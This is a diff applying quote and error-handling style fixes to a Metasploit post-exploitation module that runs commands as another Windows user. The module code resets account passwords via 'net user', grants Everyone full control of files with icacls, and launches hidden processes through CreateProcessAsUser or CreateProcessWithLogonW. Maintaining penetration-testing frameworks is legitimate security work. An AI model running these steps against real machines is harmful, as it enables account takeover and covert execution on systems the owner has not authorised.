@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => "Windows Manage Run Command As User",
+        'Name' => 'Windows Manage Run Command As User',
         'Description' => %q{
           This module will login with the specified username/password and execute the
           supplied command as a hidden process. Output is not returned by default, by setting
@@ -59,42 +59,40 @@ class MetasploitModule < Msf::Post
   def priv_check
     if is_system?
       privs = session.sys.config.getprivs
-      return privs.include?("SeAssignPrimaryTokenPrivilege") && privs.include?("SeIncreaseQuotaPrivilege")
+      return privs.include?('SeAssignPrimaryTokenPrivilege') && privs.include?('SeIncreaseQuotaPrivilege')
     end
 
     false
   end
 
   def reset_pass(user, password)
-    begin
-      tmpout = cmd_exec("cmd.exe /c net user #{user} #{password}")
-      return tmpout.include?("successfully")
-    rescue
-      return false
-    end
+    tmpout = cmd_exec("cmd.exe /c net user #{user} #{password}")
+    return tmpout.include?('successfully')
+  rescue StandardError
+    return false
   end
 
   def touch(path)
-    write_file(path, "")
+    write_file(path, '')
     cmd_exec("icacls #{path} /grant Everyone:(F)")
   end
 
   def run
     # Make sure we meet the requirements before running the script, note no need to return
     # unless error
-    return unless session.type == "meterpreter"
+    return unless session.type == 'meterpreter'
 
     pi = nil
     # check/set vars
-    setpass = datastore["SETPASS"]
-    cmdout = datastore["CMDOUT"]
-    user = datastore["USER"] || nil
-    password = datastore["PASSWORD"] || nil
-    cmd = datastore["CMD"] || nil
+    setpass = datastore['SETPASS']
+    cmdout = datastore['CMDOUT']
+    user = datastore['USER'] || nil
+    password = datastore['PASSWORD'] || nil
+    cmd = datastore['CMD'] || nil
     domain = datastore['DOMAIN']
 
     if setpass
-      print_status("Setting user password")
+      print_status('Setting user password')
       fail_with(Failure::Unknown, 'Error resetting password') unless reset_pass(user, password)
     end
 
@@ -112,14 +110,14 @@ class MetasploitModule < Msf::Post
     # if user use createprocesswithlogon, if system logonuser and createprocessasuser
     # execute command and get output with a poor mans pipe
     if priv_check
-      print_status("Executing CreateProcessAsUserA...we are SYSTEM")
+      print_status('Executing CreateProcessAsUserA...we are SYSTEM')
       pi = create_process_as_user(domain, user, password, nil, cmdstr)
       if pi
         session.railgun.kernel32.CloseHandle(pi[:process_handle])
         session.railgun.kernel32.CloseHandle(pi[:thread_handle])
       end
     else
-      print_status("Executing CreateProcessWithLogonW...")
+      print_status('Executing CreateProcessWithLogonW...')
       pi = create_process_with_logon(domain, user, password, nil, cmdstr)
     end
 
